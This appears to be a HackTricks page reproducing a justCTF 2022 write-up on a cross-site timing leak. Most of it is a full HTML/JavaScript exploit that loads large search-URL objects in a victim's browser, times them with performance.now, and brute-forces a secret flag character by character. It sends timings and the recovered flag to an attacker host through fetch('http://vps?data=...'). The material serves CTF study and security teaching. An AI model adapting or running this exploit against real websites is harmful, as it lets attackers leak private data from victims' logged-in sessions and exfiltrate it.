# performance.now + Force heavy task

{{#include ../../banners/hacktricks-training.md}}

**Exploit taken from [https://blog.huli.tw/2022/06/14/en/justctf-2022-xsleak-writeup/](https://blog.huli.tw/2022/06/14/en/justctf-2022-xsleak-writeup/)**

In this challenge the user could sent thousands of chars and if the flag was contained, the chars would be sent back to the bot. So putting a big amount of chars the attacker could measure if the flag was containing in the sent string or not.

> [!WARNING]
> Initially, I didn’t set object width and height, but later on, I found that it’s important because the default size is too small to make a difference in the load time.

```html
<!DOCTYPE html>
<html>
  <head> </head>
  <body>
    <img src="https://deelay.me/30000/https://example.com" />
    <script>
      fetch("https://deelay.me/30000/https://example.com")

      function send(data) {
        fetch("http://vps?data=" + encodeURIComponent(data)).catch((err) => 1)
      }

      function leak(char, callback) {
        return new Promise((resolve) => {
          let ss = "just_random_string"
          let url =
            `http://baby-xsleak-ams3.web.jctf.pro/search/?search=${char}&msg=` +
            ss[Math.floor(Math.random() * ss.length)].repeat(1000000)
          let start = performance.now()
          let object = document.createElement("object")
          object.width = "2000px"
          object.height = "2000px"
          object.data = url
          object.onload = () => {
            object.remove()
            let end = performance.now()
            resolve(end - start)
          }
          object.onerror = () => console.log("Error event triggered")
          document.body.appendChild(object)
        })
      }

      send("start")

      let charset = "abcdefghijklmnopqrstuvwxyz_}".split("")
      let flag = "justCTF{"

      async function main() {
        let found = 0
        let notFound = 0
        for (let i = 0; i < 3; i++) {
          await leak("..")
        }
        for (let i = 0; i < 3; i++) {
          found += await leak("justCTF")
        }
        for (let i = 0; i < 3; i++) {
          notFound += await leak("NOT_FOUND123")
        }

        found /= 3
        notFound /= 3

        send("found flag:" + found)
        send("not found flag:" + notFound)

        let threshold = found - (found - notFound) / 2
        send("threshold:" + threshold)

        if (notFound > found) {
          return
        }

        // exploit
        while (true) {
          if (flag[flag.length - 1] === "}") {
            break
          }
          for (let char of charset) {
            let trying = flag + char
            let time = 0
            for (let i = 0; i < 3; i++) {
              time += await leak(trying)
            }
            time /= 3
            send("char:" + trying + ",time:" + time)
            if (time >= threshold) {
              flag += char
              send(flag)
              break
            }
          }
        }
      }

      main()
    </script>
  </body>
</html>
```

{{#include ../../banners/hacktricks-training.md}}



